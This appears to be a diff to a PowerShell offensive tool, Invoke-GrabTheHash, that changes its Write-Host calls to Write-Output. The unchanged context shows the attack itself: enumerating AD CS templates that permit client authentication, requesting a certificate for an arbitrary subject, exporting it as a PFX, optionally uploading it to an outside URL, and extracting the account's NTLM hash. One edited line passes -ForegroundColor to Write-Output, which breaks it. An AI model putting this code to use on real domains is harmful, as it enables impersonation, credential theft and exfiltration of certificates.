@@ -79,14 +79,14 @@ function Invoke-GrabTheHash
 	$ErrorActionPreference = "SilentlyContinue"
 	$WarningPreference = "SilentlyContinue"
 	
-	Write-Host ""
+	Write-Output ""
 	
 	if($Machine){
 		$isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
 		if($isAdmin){}
 		else{
-			Write-Host "[-] Not running on an elevated context. Working with Machine Certificates will fail." -ForegroundColor Yellow
-			Write-Host ""
+			Write-Output "[-] Not running on an elevated context. Working with Machine Certificates will fail." -ForegroundColor Yellow
+			Write-Output ""
 		}
 	}
 
@@ -95,8 +95,8 @@ function Invoke-GrabTheHash
 	}
 	else{
 
-		Write-Host "[-] Domain switch not provided. Enumerating the Domain Name..."
-		Write-Host ""
+		Write-Output "[-] Domain switch not provided. Enumerating the Domain Name..."
+		Write-Output ""
  
 		try{
 			$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -104,14 +104,14 @@ function Invoke-GrabTheHash
 		}
 		catch{$currentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
 
-		Write-Host "[+] Target Domain will be set to: $currentDomain"
-		Write-Host ""
+		Write-Output "[+] Target Domain will be set to: $currentDomain"
+		Write-Output ""
 	}
 
  	if($CertTemplates){
 
-		Write-Host "[+] Certificate Templates:"
-		Write-Host ""
+		Write-Output "[+] Certificate Templates:"
+		Write-Output ""
 
 		try{
 
@@ -134,9 +134,9 @@ function Invoke-GrabTheHash
 
 			$AllTemplates | Sort
 
-   			Write-Host ""
-			Write-Host "[+] Certificates that permit client authentication:"
-			Write-Host ""
+   			Write-Output ""
+			Write-Output "[+] Certificates that permit client authentication:"
+			Write-Output ""
 			
 			$searcher.Filter = "(&(objectClass=pKICertificateTemplate)(pkiExtendedKeyUsage=1.3.6.1.5.5.7.3.2))"
 			$searcher.SearchScope = "Subtree"
@@ -163,7 +163,7 @@ function Invoke-GrabTheHash
 			$AllTemplates -split "`n" | Where-Object { $_ -match 'TemplatePropCommonName' } | ForEach-Object { $_.Replace('TemplatePropCommonName = ', '').Trim() } | Sort
 		}
 
-		Write-Host ""
+		Write-Output ""
 
 		break
 	}
@@ -177,8 +177,8 @@ function Invoke-GrabTheHash
 		
 		if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
 			$ntlmValue = $Matches[1]
-			Write-Host "$CN NTLM hash: $ntlmValue"
-			Write-Host ""
+			Write-Output "$CN NTLM hash: $ntlmValue"
+			Write-Output ""
 		}
 
 		break
@@ -231,8 +231,8 @@ function Invoke-GrabTheHash
 		foreach($file in $tempfiles){remove-item ".\$file" -ErrorAction silentlycontinue}
 	}
 
-	Write-Host "[+] Requesting certificate with subject $CN"
- 	Write-Host ""
+	Write-Output "[+] Requesting certificate with subject $CN"
+ 	Write-Output ""
 	
 	if($Machine){
 	$file = @"
@@ -268,8 +268,8 @@ CertificateTemplate = "$TemplateName"
 	Invoke-Expression -Command "certreq -new -q certreq.inf certreq.req" >$null 2>&1
 	if(!($LastExitCode -eq 0))
 	{
-		Write-Host "[-] Certificate request failed"
-		Write-Host ""
+		Write-Output "[-] Certificate request failed"
+		Write-Output ""
 		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
 		break
 	}
@@ -297,8 +297,8 @@ CertificateTemplate = "$TemplateName"
 	
 	if(!($LastExitCode -eq 0))
 	{
-		Write-Host "[-] Certificate request failed"
-		Write-Host ""
+		Write-Output "[-] Certificate request failed"
+		Write-Output ""
 		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
 		break
 	}
@@ -307,8 +307,8 @@ CertificateTemplate = "$TemplateName"
 
 	if(!($LastExitCode -eq 0))
 	{
-		Write-Host "[-] Certificate request failed"
-		Write-Host ""
+		Write-Output "[-] Certificate request failed"
+		Write-Output ""
 		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
 		break
 	}
@@ -318,8 +318,8 @@ CertificateTemplate = "$TemplateName"
 	
 	else
 	{
-		Write-Host "[-] Certificate request failed"
-		Write-Host ""
+		Write-Output "[-] Certificate request failed"
+		Write-Output ""
 		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
 		break
 	}
@@ -330,8 +330,8 @@ CertificateTemplate = "$TemplateName"
 	$certbytes = $cert.export([System.Security.Cryptography.X509Certificates.X509ContentType]::pfx)
 
 	$certbytes | Set-Content -Encoding Byte -Path "$CN.pfx" -ea Stop
-	Write-Host "[+] Certificate successfully exported to $CN.pfx"
-	Write-Host ""
+	Write-Output "[+] Certificate successfully exported to $CN.pfx"
+	Write-Output ""
 	
 	if($Machine){$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'LocalMachine')}
 	else{$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'CurrentUser')}
@@ -342,8 +342,8 @@ CertificateTemplate = "$TemplateName"
 	Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
 
  	if($Upload){
-		Write-Host "[+] Uploading $CN.pfx to $Upload"
-		Write-Host ""
+		Write-Output "[+] Uploading $CN.pfx to $Upload"
+		Write-Output ""
 		$file = "$pwd\$CN.pfx";
 		$httpuri = "$Upload";
 		$webclient = New-Object System.Net.WebClient;
@@ -352,8 +352,8 @@ CertificateTemplate = "$TemplateName"
 	}
 	
 	if($Break){
-		Write-Host "[-] Stopping here, before grabbing the Hash"
-		Write-Host ""
+		Write-Output "[-] Stopping here, before grabbing the Hash"
+		Write-Output ""
 		break
 	}
 		
@@ -365,7 +365,7 @@ CertificateTemplate = "$TemplateName"
 	
 	if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
 		$ntlmValue = $Matches[1]
-		Write-Host "[+] $CN NTLM hash: $ntlmValue"
-		Write-Host ""
+		Write-Output "[+] $CN NTLM hash: $ntlmValue"
+		Write-Output ""
 	}
 }
